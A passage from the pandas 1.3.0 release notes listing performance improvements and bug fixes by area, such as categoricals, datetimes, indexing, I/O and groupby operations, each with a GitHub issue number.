:meth:`.SeriesGroupBy.cummax` with nullable data types (:issue:`37493`)\n- Performance improvement in :meth:`Series.nunique` with nan values (:issue:`40865`)\n- Performance improvement in :meth:`DataFrame.transpose`, :meth:`Series.unstack` with ``DatetimeTZDtype`` (:issue:`40149`)\n- Performance improvement in :meth:`Series.plot` and :meth:`DataFrame.plot` with entry point lazy loading (:issue:`41492`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_130.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nCategorical\n^^^^^^^^^^^\n- Bug in :class:`CategoricalIndex` incorrectly failing to raise ``TypeError`` when scalar data is passed (:issue:`38614`)\n- Bug in ``CategoricalIndex.reindex`` failed when the :class:`Index` passed was not categorical but whose values were all labels in the category (:issue:`28690`)\n- Bug where constructing a :class:`Categorical` from an object-dtype array of ``date`` objects did not round-trip correctly with ``astype`` (:issue:`38552`)\n- Bug in constructing a :class:`DataFrame` from an ``ndarray`` and a :class:`CategoricalDtype` (:issue:`38857`)\n- Bug in setting categorical values into an object-dtype column in a :class:`DataFrame` (:issue:`39136`)\n- Bug in :meth:`DataFrame.reindex` was raising an ``IndexError`` when the new index contained duplicates and the old index was a :class:`CategoricalIndex` (:issue:`38906`)\n- Bug in :meth:`Categorical.fillna` with a tuple-like category raising ``NotImplementedError`` instead of ``ValueError`` when filling with a non-category tuple (:issue:`41914`)\n\nDatetimelike\n^^^^^^^^^^^^\n- Bug in :class:`DataFrame` and :class:`Series` constructors sometimes dropping nanoseconds from :class:`Timestamp` (resp. :class:`Timedelta`) ``data``, with ``dtype=datetime64[ns]`` (resp. ``timedelta64[ns]``) (:issue:`38032`)\n- Bug in :meth:`DataFrame.first` and :meth:`Series.first` with an offset of one month returning an incorrect result when the first day is the last day of a month (:issue:`29623`)\n- Bug in constructing a :class:`DataFrame` or :class:`Series` with mismatched ``datetime64`` data and ``timedelta64`` dtype, or vice-versa, failing to raise a ``TypeError`` (:issue:`38575`, :issue:`38764`, :issue:`38792`)\n- Bug in constructing a :class:`Series` or :class:`DataFrame` with a ``datetime`` object out of bounds for ``datetime64[ns]`` dtype or a ``timedelta`` object out of bounds for ``timedelta64[ns]`` dtype (:issue:`38792`, :issue:`38965`)\n- Bug in :meth:`DatetimeIndex.intersection`, :meth:`DatetimeIndex.symmetric_difference`, :meth:`PeriodIndex.intersection`, :meth:`PeriodIndex.symmetric_difference` always returning object-dtype when operating with :class:`CategoricalIndex` (:issue:`38741`)\n- Bug in :meth:`DatetimeIndex.intersection` giving incorrect results with non-Tick frequencies with ``n != 1`` (:issue:`42104`)\n- Bug in :meth:`Series.where` incorrectly casting ``datetime64`` values to ``int64`` (:issue:`37682`)\n- Bug in :class:`Categorical` incorrectly typecasting ``datetime`` object to ``Timestamp`` (:issue:`38878`)\n- Bug in comparisons between :class:`Timestamp` object and ``datetime64`` objects just outside the implementation bounds for nanosecond ``datetime64`` (:issue:`39221`)\n- Bug in :meth:`Timestamp.round`, :meth:`Timestamp.floor`, :meth:`Timestamp.ceil` for values near the implementation bounds of :class:`Timestamp` (:issue:`39244`)\n- Bug in :meth:`Timedelta.round`, :meth:`Timedelta.floor`, :meth:`Timedelta.ceil` for values near the implementation bounds of :class:`Timedelta` (:issue:`38964`)\n- Bug in :func:`date_range` incorrectly creating :class:`DatetimeIndex` containing ``NaT`` instead of raising ``OutOfBoundsDatetime`` in corner cases (:issue:`24124`)\n- Bug in :func:`infer_freq` incorrectly fails to infer 'H' frequency of :class:`DatetimeIndex` if the latter has a timezone and crosses DST boundaries (:issue:`39556`)\n- Bug in :class:`Series` backed by :class:`DatetimeArray` or :class:`TimedeltaArray` sometimes failing to set the array's ``freq`` to ``None`` (:issue:`41425`)\n\nTimedelta\n^^^^^^^^^\n- Bug in constructing :class:`Timedelta` from ``np.timedelta64`` objects with non-nanosecond units that are out of bounds for ``timedelta64[ns]`` (:issue:`38965`)\n- Bug in constructing a :class:`TimedeltaIndex` incorrectly accepting ``np.datetime64(\"NaT\")`` objects (:issue:`39462`)\n- Bug in constructing :class:`Timedelta` from an input string with only symbols and no digits failed to raise an error (:issue:`39710`)\n- Bug in :class:`TimedeltaIndex` and :func:`to_timedelta` failing to raise when passed non-nanosecond ``timedelta64`` arrays that overflow when converting to ``timedelta64[ns]`` (:issue:`40008`)\n\nTimezones\n^^^^^^^^^\n- Bug in different ``tzinfo`` objects representing UTC not being treated as equivalent (:issue:`39216`)\n- Bug in ``dateutil.tz.gettz(\"UTC\")`` not being recognized as equivalent to other UTC-representing tzinfos (:issue:`39276`)\n\nNumeric\n^^^^^^^\n- Bug in :meth:`DataFrame.quantile`, :meth:`DataFrame.sort_values` causing incorrect subsequent indexing behavior (:issue:`38351`)\n- Bug in :meth:`DataFrame.sort_values` raising an :class:`IndexError` for empty ``by`` (:issue:`40258`)\n- Bug in :meth:`DataFrame.select_dtypes` with ``include=np.number`` would drop numeric ``ExtensionDtype`` columns (:issue:`35340`)\n- Bug in :meth:`DataFrame.mode` and :meth:`Series.mode` not keeping consistent integer :class:`Index` for empty input (:issue:`33321`)\n- Bug in :meth:`DataFrame.rank` when the DataFrame contained ``np.inf`` (:issue:`32593`)\n- Bug in :meth:`DataFrame.rank` with ``axis=0`` and columns holding incomparable types raising an ``IndexError`` (:issue:`38932`)\n- Bug in :meth:`Series.rank`, :meth:`DataFrame.rank`, :meth:`.DataFrameGroupBy.rank`, and :meth:`.SeriesGroupBy.rank` treating the most negative ``int64`` value as missing (:issue:`32859`)\n- Bug in :meth:`DataFrame.select_dtypes` different behavior between Windows and Linux with ``include=\"int\"`` (:issue:`36596`)\n- Bug in :meth:`DataFrame.apply` and :meth:`DataFrame.agg` when passed the argument ``func=\"size\"`` would operate on the entire ``DataFrame`` instead of rows or columns (:issue:`39934`)\n- Bug in :meth:`DataFrame.transform` would raise a ``SpecificationError`` when passed a dictionary and columns were missing; will now raise a ``KeyError`` instead (:issue:`40004`)\n- Bug in :meth:`.DataFrameGroupBy.rank` and :meth:`.SeriesGroupBy.rank` giving incorrect results with ``pct=True`` and equal values between consecutive groups (:issue:`40518`)\n- Bug in :meth:`Series.count` would result in an ``int32`` result on 32-bit platforms when argument ``level=None`` (:issue:`40908`)\n- Bug in :class:`Series` and :class:`DataFrame` reductions with methods ``any`` and ``all`` not returning Boolean results for object data (:issue:`12863`, :issue:`35450`, :issue:`27709`)\n- Bug in :meth:`Series.clip` would fail if the Series contains NA values and has nullable int or float as a data type (:issue:`40851`)\n- Bug in :meth:`UInt64Index.where` and :meth:`UInt64Index.putmask` with an ``np.int64`` dtype ``other`` incorrectly raising ``TypeError`` (:issue:`41974`)\n- Bug in :meth:`DataFrame.agg()` not sorting the aggregated axis in the order of the provided aggregation functions when one or more aggregation function fails to produce results (:issue:`33634`)\n- Bug in :meth:`DataFrame.clip` not interpreting missing values as no threshold (:issue:`40420`)\n\nConversion\n^^^^^^^^^^\n- Bug in :meth:`Series.to_dict` with ``orient='records'`` now returns Python native types (:issue:`25969`)\n- Bug in :meth:`Series.view` and :meth:`Index.view` when converting between datetime-like (``datetime64[ns]``, ``datetime64[ns, tz]``, ``timedelta64``, ``period``) dtypes (:issue:`39788`)\n- Bug in creating a :class:`DataFrame` from an empty ``np.recarray`` not retaining the original dtypes (:issue:`40121`)\n- Bug in :class:`DataFrame` failing to raise a ``TypeError`` when constructing from a ``frozenset`` (:issue:`40163`)\n- Bug in :class:`Index` construction silently ignoring a passed ``dtype`` when the data cannot be cast to that dtype (:issue:`21311`)\n- Bug in :meth:`StringArray.astype` falling back to NumPy and raising when converting to ``dtype='categorical'`` (:issue:`40450`)\n- Bug in :func:`factorize` where, when given an array with a numeric NumPy dtype lower than int64, uint64 and float64, the unique values did not keep their original dtype (:issue:`41132`)\n- Bug in :class:`DataFrame` construction with a dictionary containing an array-like with ``ExtensionDtype`` and ``copy=True`` failing to make a copy (:issue:`38939`)\n- Bug in :meth:`qcut` raising error when taking ``Float64DType`` as input (:issue:`40730`)\n- Bug in :class:`DataFrame` and :class:`Series` construction with ``datetime64[ns]`` data and ``dtype=object`` resulting in ``datetime`` objects instead of :class:`Timestamp` objects (:issue:`41599`)\n- Bug in :class:`DataFrame` and :class:`Series` construction with ``timedelta64[ns]`` data and ``dtype=object`` resulting in ``np.timedelta64`` objects instead of :class:`Timedelta` objects (:issue:`41599`)\n- Bug in :class:`DataFrame` construction when given a two-dimensional object-dtype ``np.ndarray`` of :class:`Period` or :class:`Interval` objects failing to cast to :class:`PeriodDtype` or :class:`IntervalDtype`, respectively (:issue:`41812`)\n- Bug in constructing a :class:`Series` from a list and a :class:`PandasDtype` (:issue:`39357`)\n- Bug in creating a :class:`Series` from a ``range`` object that does not fit in the bounds of ``int64`` dtype (:issue:`30173`)\n- Bug in creating a :class:`Series` from a ``dict`` with all-tuple keys and an :class:`Index` that requires reindexing (:issue:`41707`)\n- Bug in :func:`.infer_dtype` not recognizing Series, Index, or array with a Period dtype (:issue:`23553`)\n- Bug in :func:`.infer_dtype` raising an error for general :class:`.ExtensionArray` objects. It will now return ``\"unknown-array\"`` instead of raising (:issue:`37367`)\n- Bug in :meth:`DataFrame.convert_dtypes` incorrectly raised a ``ValueError`` when called on an empty DataFrame (:issue:`40393`)\n\nStrings\n^^^^^^^\n- Bug in the conversion from ``pyarrow.ChunkedArray`` to :class:`~arrays.StringArray` when the original had zero chunks (:issue:`41040`)\n- Bug in :meth:`Series.replace` and :meth:`DataFrame.replace` ignoring replacements with ``regex=True`` for ``StringDType`` data (:issue:`41333`, :issue:`35977`)\n- Bug in :meth:`Series.str.extract` with :class:`~arrays.StringArray` returning object dtype for an empty :class:`DataFrame` (:issue:`41441`)\n- Bug in :meth:`Series.str.replace` where the ``case`` argument was ignored when ``regex=False`` (:issue:`41602`)\n\nInterval\n^^^^^^^^\n- Bug in :meth:`IntervalIndex.intersection` and :meth:`IntervalIndex.symmetric_difference` always returning object-dtype when operating with :class:`CategoricalIndex` (:issue:`38653`, :issue:`38741`)\n- Bug in :meth:`IntervalIndex.intersection` returning duplicates when at least one of the :class:`Index` objects have duplicates which are present in the other (:issue:`38743`)\n- :meth:`IntervalIndex.union`, :meth:`IntervalIndex.intersection`, :meth:`IntervalIndex.difference`, and :meth:`IntervalIndex.symmetric_difference` now cast to the appropriate dtype instead of raising a ``TypeError`` when operating with another :class:`IntervalIndex` with incompatible dtype (:issue:`39267`)\n- :meth:`PeriodIndex.union`, :meth:`PeriodIndex.intersection`, :meth:`PeriodIndex.symmetric_difference`, :meth:`PeriodIndex.difference` now cast to object dtype instead of raising ``IncompatibleFrequency`` when operating with another :class:`PeriodIndex` with incompatible dtype (:issue:`39306`)\n- Bug in :meth:`IntervalIndex.is_monotonic`, :meth:`IntervalIndex.get_loc`, :meth:`IntervalIndex.get_indexer_for`, and :meth:`IntervalIndex.__contains__` when NA values are present (:issue:`41831`)\n\nIndexing\n^^^^^^^^\n- Bug in :meth:`Index.union` and :meth:`MultiIndex.union` dropping duplicate ``Index`` values when ``Index`` was not monotonic or ``sort`` was set to ``False`` (:issue:`36289`, :issue:`31326`, :issue:`40862`)\n- Bug in :meth:`CategoricalIndex.get_indexer` failing to raise ``InvalidIndexError`` when non-unique (:issue:`38372`)\n- Bug in :meth:`IntervalIndex.get_indexer` when ``target`` has ``CategoricalDtype`` and both the index and the target contain NA values (:issue:`41934`)\n- Bug in :meth:`Series.loc` raising a ``ValueError`` when input was filtered with a Boolean list and values to set were a list with lower dimension (:issue:`20438`)\n- Bug in inserting many new columns into a :class:`DataFrame` causing incorrect subsequent indexing behavior (:issue:`38380`)\n- Bug in :meth:`DataFrame.__setitem__` raising a ``ValueError`` when setting multiple values to duplicate columns (:issue:`15695`)\n- Bug in :meth:`DataFrame.loc`, :meth:`Series.loc`, :meth:`DataFrame.__getitem__` and :meth:`Series.__getitem__` returning incorrect elements for non-monotonic :class:`DatetimeIndex` for string slices (:issue:`33146`)\n- Bug in :meth:`DataFrame.reindex` and :meth:`Series.reindex` with timezone aware indexes raising a ``TypeError`` for ``method=\"ffill\"`` and ``method=\"bfill\"`` and specified ``tolerance`` (:issue:`38566`)\n- Bug in :meth:`DataFrame.reindex` with ``datetime64[ns]`` or ``timedelta64[ns]`` incorrectly casting to integers when the ``fill_value`` requires casting to object dtype (:issue:`39755`)\n- Bug in :meth:`DataFrame.__setitem__` raising a ``ValueError`` when setting on an empty :class:`DataFrame` using specified columns and a nonempty :class:`DataFrame` value (:issue:`38831`)\n- Bug in :meth:`DataFrame.loc.__setitem__` raising a ``ValueError`` when operating on a unique column when the :class:`DataFrame` has duplicate columns (:issue:`38521`)\n- Bug in :meth:`DataFrame.iloc.__setitem__` and :meth:`DataFrame.loc.__setitem__` with mixed dtypes when setting with a dictionary value (:issue:`38335`)\n- Bug in :meth:`Series.loc.__setitem__` and :meth:`DataFrame.loc.__setitem__` raising ``KeyError`` when provided a Boolean generator (:issue:`39614`)\n- Bug in :meth:`Series.iloc` and :meth:`DataFrame.iloc` raising a ``KeyError`` when provided a generator (:issue:`39614`)\n- Bug in :meth:`DataFrame.__setitem__` not raising a ``ValueError`` when the right hand side is a :class:`DataFrame` with wrong number of columns (:issue:`38604`)\n- Bug in :meth:`Series.__setitem__` raising a ``ValueError`` when setting a :class:`Series` with a scalar indexer (:issue:`38303`)\n- Bug in :meth:`DataFrame.loc` dropping levels of a :class:`MultiIndex` when the :class:`DataFrame` used as input has only one row (:issue:`10521`)\n- Bug in :meth:`DataFrame.__getitem__` and :meth:`Series.__getitem__` always raising ``KeyError`` when slicing with existing strings where the :class:`Index` has milliseconds (:issue:`33589`)\n- Bug in setting ``timedelta64`` or ``datetime64`` values into numeric :class:`Series` failing to cast to object dtype (:issue:`39086`, :issue:`39619`)\n- Bug in setting :class:`Interval` values into a :class:`Series` or :class:`DataFrame` with mismatched :class:`IntervalDtype` incorrectly casting the new values to the existing dtype (:issue:`39120`)\n- Bug in setting ``datetime64`` values into a :class:`Series` with integer-dtype incorrectly casting the datetime64 values to integers (:issue:`39266`)\n- Bug in setting ``np.datetime64(\"NaT\")`` into a :class:`Series` with :class:`Datetime64TZDtype` incorrectly treating the timezone-naive value as timezone-aware (:issue:`39769`)\n- Bug in :meth:`Index.get_loc` not raising ``KeyError`` when ``key=NaN`` and ``method`` is specified but ``NaN`` is not in the :class:`Index` (:issue:`39382`)\n- Bug in :meth:`DatetimeIndex.insert` when inserting ``np.datetime64(\"NaT\")`` into a timezone-aware index incorrectly treating the timezone-naive value as timezone-aware (:issue:`39769`)\n- Bug in incorrectly raising in :meth:`Index.insert`, when setting a new column that cannot be held in the existing ``frame.columns``, or in :meth:`Series.reset_index` or :meth:`DataFrame.reset_index` instead of casting to a compatible dtype (:issue:`39068`)\n- Bug in :meth:`RangeIndex.append` where a single object of length 1 was concatenated incorrectly (:issue:`39401`)\n- Bug in :meth:`RangeIndex.astype` where when converting to :class:`CategoricalIndex`, the categories became a :class:`Int64Index` instead of a :class:`RangeIndex` (:issue:`41263`)\n- Bug in setting ``numpy.timedelta64`` values into an object-dtype :class:`Series` using a Boolean indexer (:issue:`39488`)\n- Bug in setting numeric values into a into a boolean-dtypes :class:`Series` using ``at`` or ``iat`` failing to cast to object-dtype (:issue:`39582`)\n- Bug in :meth:`DataFrame.__setitem__` and :meth:`DataFrame.iloc.__setitem__` raising ``ValueError`` when trying to index with a row-slice and setting a list as values (:issue:`40440`)\n- Bug in :meth:`DataFrame.loc` not raising ``KeyError`` when the key was not found in :class:`MultiIndex` and the levels were not fully specified (:issue:`41170`)\n- Bug in :meth:`DataFrame.loc.__setitem__` when setting-with-expansion incorrectly raising when the index in the expanding axis contained duplicates (:issue:`40096`)\n- Bug in :meth:`DataFrame.loc.__getitem__` with :class:`MultiIndex` casting to float when at least one index column has float dtype and we retrieve a scalar (:issue:`41369`)\n- Bug in :meth:`DataFrame.loc` incorrectly matching non-Boolean index elements (:issue:`20432`)\n- Bug in indexing with ``np.nan`` on a :class:`Series` or :class:`DataFrame` with a :class:`CategoricalIndex` incorrectly raising ``KeyError`` when ``np.nan`` keys are present (:issue:`41933`)\n- Bug in :meth:`Series.__delitem__` with ``ExtensionDtype`` incorrectly casting to ``ndarray`` (:issue:`40386`)\n- Bug in :meth:`DataFrame.at` with a :class:`CategoricalIndex` returning incorrect results when passed integer keys (:issue:`41846`)\n- Bug in :meth:`DataFrame.loc` returning a :class:`MultiIndex` in the wrong order if an indexer has duplicates (:issue:`40978`)\n- Bug in :meth:`DataFrame.__setitem__` raising a ``TypeError`` when using a ``str`` subclass as the column name with a :class:`DatetimeIndex` (:issue:`37366`)\n- Bug in :meth:`PeriodIndex.get_loc` failing to raise a ``KeyError`` when given a :class:`Period` with a mismatched ``freq`` (:issue:`41670`)\n- Bug ``.loc.__getitem__`` with a :class:`UInt64Index` and negative-integer keys raising ``OverflowError`` instead of ``KeyError`` in some cases, wrapping around to positive integers in others (:issue:`41777`)\n- Bug in :meth:`Index.get_indexer` failing to raise ``ValueError`` in some cases with invalid ``method``, ``limit``, or ``tolerance`` arguments (:issue:`41918`)\n- Bug when slicing a :class:`Series` or :class:`DataFrame` with a :class:`TimedeltaIndex` when passing an invalid string raising ``ValueError`` instead of a ``TypeError`` (:issue:`41821`)\n- Bug in :class:`Index` constructor sometimes silently ignoring a specified ``dtype`` (:issue:`38879`)\n- :meth:`Index.where` behavior now mirrors :meth:`Index.putmask` behavior, i.e. ``index.where(mask, other)`` matches ``index.putmask(~mask, other)`` (:issue:`39412`)\n\nMissing\n^^^^^^^\n- Bug in :class:`Grouper` did not correctly propagate the ``dropna`` argument; :meth:`.DataFrameGroupBy.transform` now correctly handles missing values for ``dropna=True`` (:issue:`35612`)\n- Bug in :func:`isna`, :meth:`Series.isna`, :meth:`Index.isna`, :meth:`DataFrame.isna`, and the corresponding ``notna`` functions not recognizing ``Decimal(\"NaN\")`` objects (:issue:`39409`)\n- Bug in :meth:`DataFrame.fillna` not accepting a dictionary for the ``downcast`` keyword (:issue:`40809`)\n- Bug in :func:`isna` not returning a copy of the mask for nullable types, causing any subsequent mask modification to change the original array (:issue:`40935`)\n- Bug in :class:`DataFrame` construction with float data containing ``NaN`` and an integer ``dtype`` casting instead of retaining the ``NaN`` (:issue:`26919`)\n- Bug in :meth:`Series.isin` and :meth:`MultiIndex.isin` didn't treat all nans as equivalent if they were in tuples (:issue:`41836`)\n\nMultiIndex\n^^^^^^^^^^\n- Bug in :meth:`DataFrame.drop` raising a ``TypeError`` when the :class:`MultiIndex` is non-unique and ``level`` is not provided (:issue:`36293`)\n- Bug in :meth:`MultiIndex.intersection` duplicating ``NaN`` in the result (:issue:`38623`)\n- Bug in :meth:`MultiIndex.equals` incorrectly returning ``True`` when the :class:`MultiIndex` contained ``NaN`` even when they are differently ordered (:issue:`38439`)\n- Bug in :meth:`MultiIndex.intersection` always returning an empty result when intersecting with :class:`CategoricalIndex` (:issue:`38653`)\n- Bug in :meth:`MultiIndex.difference` incorrectly raising ``TypeError`` when indexes contain non-sortable entries (:issue:`41915`)\n- Bug in :meth:`MultiIndex.reindex` raising a ``ValueError`` when used on an empty :class:`MultiIndex` and indexing only a specific level (:issue:`41170`)\n- Bug in :meth:`MultiIndex.reindex` raising ``TypeError`` when reindexing against a flat :class:`Index` (:issue:`41707`)\n\nI/O\n^^^\n- Bug in :meth:`Index.__repr__` when ``display.max_seq_items=1`` (:issue:`38415`)\n- Bug in :func:`read_csv` not recognizing scientific notation if the argument ``decimal`` is set and ``engine=\"python\"`` (:issue:`31920`)\n- Bug in :func:`read_csv` interpreting ``NA`` value as comment, when ``NA`` does contain the comment string fixed for ``engine=\"python\"`` (:issue:`34002`)\n- Bug in :func:`read_csv` raising an ``IndexError`` with multiple header columns and ``index_col`` is specified when the file has no data rows (:issue:`38292`)\n- Bug in :func:`read_csv` not accepting ``usecols`` with a different length than ``names`` for ``engine=\"python\"`` (:issue:`16469`)\n- Bug in :meth:`read_csv` returning object dtype when ``delimiter=\",\"`` with ``usecols`` and ``parse_dates`` specified for ``engine=\"python\"`` (:issue:`35873`)\n- Bug in :func:`read_csv` raising a ``TypeError`` when ``names`` and ``parse_dates`` is specified for ``engine=\"c\"`` (:issue:`33699`)\n- Bug in :func:`read_clipboard` and :func:`DataFrame.to_clipboard` not working in WSL (:issue:`38527`)\n- Allow custom error values for the ``parse_dates`` argument of :func:`read_sql`, :func:`read_sql_query` and :func:`read_sql_table` (:issue:`35185`)\n- Bug in :meth:`DataFrame.to_hdf` and :meth:`Series.to_hdf` raising a ``KeyError`` when trying to apply for subclasses of ``DataFrame`` or ``Series`` (:issue:`33748`)\n- Bug in :meth:`.HDFStore.put` raising a wrong ``TypeError`` when saving a DataFrame with non-string dtype (:issue:`34274`)\n- Bug in :func:`json_normalize` resulting in the first element of a generator object not being included in the returned DataFrame (:issue:`35923`)\n- Bug in :func:`read_csv` applying the thousands separator to date columns when the column should be parsed for dates and ``usecols`` is specified for ``engine=\"python\"`` (:issue:`39365`)\n- Bug in :func:`read_excel` forward filling :class:`MultiIndex` names when multiple header and index columns are specified (:issue:`34673`)\n- Bug in :func:`read_excel` not respecting :func:`set_option` (:issue:`34252`)\n- Bug in :func:`read_csv` not switching ``true_values`` and ``false_values`` for nullable Boolean dtype (:issue:`34655`)\n- Bug in :func:`read_json` when ``orient=\"split\"`` not maintaining a numeric string index (:issue:`28556`)\n- :meth:`read_sql` returned an empty generator if ``chunksize`` was non-zero and the query returned no results. Now returns a generator with a single empty DataFrame (:issue:`34411`)\n- Bug in :func:`read_hdf` returning unexpected records when filtering on categorical string columns using the ``where`` parameter (:issue:`39189`)\n- Bug in :func:`read_sas` raising a ``ValueError`` when ``datetimes`` were null (:issue:`39725`)\n- Bug in :func:`read_excel` dropping empty values from single-column spreadsheets (:issue:`39808`)\n- Bug in :func:`read_excel` loading trailing empty rows/columns for some filetypes (:issue:`41167`)\n- Bug in :func:`read_excel` raising an ``AttributeError`` when the excel file had a ``MultiIndex`` header followed by two empty rows and no index (:issue:`40442`)\n- Bug in :func:`read_excel`, :func:`read_csv`, :func:`read_table`, :func:`read_fwf`, and :func:`read_clipboard` where one blank row after a ``MultiIndex`` header with no index would be dropped (:issue:`40442`)\n- Bug in :meth:`DataFrame.to_string` misplacing the truncation column when ``index=False`` (:issue:`40904`)\n- Bug in :meth:`DataFrame.to_string` adding an extra dot and misaligning the truncation row when ``index=False`` (:issue:`40904`)\n- Bug in :func:`read_orc` always raising an ``AttributeError`` (:issue:`40918`)\n- Bug in :func:`read_csv` and :func:`read_table` silently ignoring ``prefix`` if ``names`` and ``prefix`` are defined, now raising a ``ValueError`` (:issue:`39123`)\n- Bug in :func:`read_csv` and :func:`read_excel` not respecting the dtype for a duplicated column name when ``mangle_dupe_cols`` is set to ``True`` (:issue:`35211`)\n- Bug in :func:`read_csv` silently ignoring ``sep`` if ``delimiter`` and ``sep`` are defined, now raising a ``ValueError`` (:issue:`39823`)\n- Bug in :func:`read_csv` and :func:`read_table` misinterpreting arguments when ``sys.setprofile`` had been previously called (:issue:`41069`)\n- Bug in the conversion from PyArrow to pandas (e.g. for reading Parquet) with nullable dtypes and a PyArrow array whose data buffer size is not a multiple of the dtype size (:issue:`40896`)\n- Bug in :func:`read_excel` would raise an error when pandas could not determine the file type even though the user specified the ``engine`` argument (:issue:`41225`)\n- Bug in :func:`read_clipboard` copying from an excel file shifts values into the wrong column if there are null values in first column (:issue:`41108`)\n- Bug in :meth:`DataFrame.to_hdf` and :meth:`Series.to_hdf` raising a ``TypeError`` when trying to append a string column to an incompatible column (:issue:`41897`)\n\nPeriod\n^^^^^^\n- Comparisons of :class:`Period` objects or :class:`Index`, :class:`Series`, or :class:`DataFrame` with mismatched ``PeriodDtype`` now behave like other mismatched-type comparisons, returning ``False`` for equals, ``True`` for not-equal, and raising ``TypeError`` for inequality checks (:issue:`39274`)\n\nPlotting\n^^^^^^^^\n- Bug in :func:`plotting.scatter_matrix` raising when 2d ``ax`` argument passed (:issue:`16253`)\n- Prevent warnings when Matplotlib's ``constrained_layout`` is enabled (:issue:`25261`)\n- Bug in :func:`DataFrame.plot` was showing the wrong colors in the legend if the function was called repeatedly and some calls used ``yerr`` while others didn't (:issue:`39522`)\n- Bug in :func:`DataFrame.plot` was showing the wrong colors in the legend if the function was called repeatedly and some calls used ``secondary_y`` and others use ``legend=False`` (:issue:`40044`)\n- Bug in :meth:`DataFrame.plot.box` when ``dark_background`` theme was selected, caps or min/max markers for the plot were not visible (:issue:`40769`)\n\nGroupby/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n- Bug in :meth:`.DataFrameGroupBy.agg` and :meth:`.SeriesGroupBy.agg` with :class:`PeriodDtype` columns incorrectly casting results too aggressively (:issue:`38254`)\n- Bug in :meth:`.SeriesGroupBy.value_counts` where unobserved categories in a grouped categorical Series were not tallied (:issue:`38672`)\n- Bug in :meth:`.SeriesGroupBy.value_counts` where an error was raised on an empty Series (:issue:`39172`)\n- Bug in :meth:`.GroupBy.indices` would contain non-existent indices when null values were present in the groupby keys (:issue:`9304`)\n- Fixed bug in :meth:`.DataFrameGroupBy.sum` and :meth:`.SeriesGroupBy.sum` causing a loss of precision by now using Kahan summation (:issue:`38778`)\n- Fixed bug in :meth:`.DataFrameGroupBy.cumsum`, :meth:`.SeriesGroupBy.cumsum`, :meth:`.DataFrameGroupBy.mean`, and :meth:`.SeriesGroupBy.mean` causing loss of precision through using Kahan summation (:issue:`38934`)\n- Bug in :meth:`.Resampler.aggregate` and :meth:`DataFrame.transform` raising a ``TypeError`` instead of ``SpecificationError`` when missing keys had mixed dtypes (:issue:`39025`)\n- Bug in :meth:`.DataFrameGroupBy.idxmin` and :meth:`.DataFrameGroupBy.idxmax` with ``ExtensionDtype`` columns (:issue:`38733`)\n- Bug in :meth:`Series.resample` would raise when the index was a :class:`PeriodIndex` consisting of ``NaT`` (:issue:`39227`)\n- Bug in :meth:`.RollingGroupby.corr` and :meth:`.ExpandingGroupby.corr` where the groupby column would return ``0`` instead of ``np.nan`` when providing ``other`` that was longer than each group (:issue:`39591`)\n- Bug in :meth:`.ExpandingGroupby.corr` and :meth:`.ExpandingGroupby.cov` where ``1`` would be returned instead of ``np.nan`` when providing ``other`` that was longer than each group (:issue:`39591`)\n- Bug in :meth:`.DataFrameGroupBy.mean`, :meth:`.SeriesGroupBy.mean`, :meth:`.DataFrameGroupBy.median`, :meth:`.SeriesGroupBy.median`, and :meth:`DataFrame.pivot_table` not propagating metadata (:issue:`28283`)\n- Bug in :meth:`Series.rolling` and :meth:`DataFrame.rolling` not calculating window bounds correctly when window is an offset and dates are in descending order (:issue:`40002`)\n- Bug in :meth:`Series.groupby` and :meth:`DataFrame.groupby` on an empty ``Series`` or ``DataFrame`` would lose index, columns, and/or data types when directly using the methods ``idxmax``, ``idxmin``, ``mad``, ``min``, ``max``, ``sum``, ``prod``, and ``skew`` or using them through ``apply``, ``aggregate``, or ``resample`` (:issue:`26411`)\n- Bug in :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` where a :class:`MultiIndex` would be created instead of an :class:`Index` when used on a :class:`.RollingGroupby` object (:issue:`39732`)\n- Bug in :meth:`.DataFrameGroupBy.sample` where an error was raised when ``weights`` was specified and the index was an :class:`Int64Index` (:issue:`39927`)\n- Bug in :meth:`.DataFrameGroupBy.aggregate` and :meth:`.Resampler.aggregate` would sometimes raise a ``SpecificationError`` when passed a dictionary and columns were missing; will now always raise a ``KeyError`` instead (:issue:`40004`)\n- Bug in :meth:`.DataFrameGroupBy.sample` where column selection was not applied before computing the result (:issue:`39928`)\n- Bug in :class:`.ExponentialMovingWindow` when calling ``__getitem__`` would incorrectly raise a ``ValueError`` when providing ``times`` (:issue:`40164`)\n- Bug in :class:`.ExponentialMovingWindow` when calling ``__getitem__`` would not retain ``com``, ``span``, ``alpha`` or ``halflife`` attributes  (:issue:`40164`)\n- :class:`.ExponentialMovingWindow` now raises a ``NotImplementedError`` when specifying ``times`` with ``adjust=False`` due to an incorrect calculation (:issue:`40098`)\n- Bug in :meth:`.ExponentialMovingWindowGroupby.mean` where the ``times`` argument was ignored when ``engine='numba'`` (:issue:`40951`)\n- Bug in :meth:`.ExponentialMovingWindowGroupby.mean` where the wrong times were used the in case of multiple groups (:issue:`40951`)\n- Bug in :class:`.ExponentialMovingWindowGroupby` where the times vector and values became out of sync for non-trivial groups (:issue:`40951`)\n- Bug in :meth:`Series.asfreq` and :meth:`DataFrame.asfreq` dropping rows when the index was not sorted (:issue:`39805`)\n- Bug in aggregation functions for :class:`DataFrame` not respecting ``numeric_only`` argument when ``level`` keyword was given (:issue:`40660`)\n- Bug in :meth:`.SeriesGroupBy.aggregate` where using a user-defined function to aggregate a Series with an object-typed :class:`Index` causes an incorrect :class:`Index` shape (:issue:`40014`)\n- Bug in :class:`.RollingGroupby` where ``as_index=False`` argument in ``groupby`` was ignored (:issue:`39433`)\n- Bug in :meth:`.DataFrameGroupBy.any`, :meth:`.SeriesGroupBy.any`, :meth:`.DataFrameGroupBy.all` and :meth:`.SeriesGroupBy.all` raising a ``ValueError`` when using with nullable type columns holding ``NA`` even with ``skipna=True`` (:issue:`40585`)\n- Bug in :meth:`.DataFrameGroupBy.cummin`, :meth:`.SeriesGroupBy.cummin`, :meth:`.DataFrameGroupBy.cummax` and :meth:`.SeriesGroupBy.cummax` incorrectly rounding integer values near the ``int64`` implementations bounds (:issue:`40767`)\n- Bug in :meth:`.DataFrameGroupBy.rank` and :meth:`.SeriesGroupBy.rank` with nullable dtypes incorrectly raising a ``TypeError`` (:issue:`41010`)\n- Bug in :meth:`.DataFrameGroupBy.cummin`, :meth:`.SeriesGroupBy.cummin`, 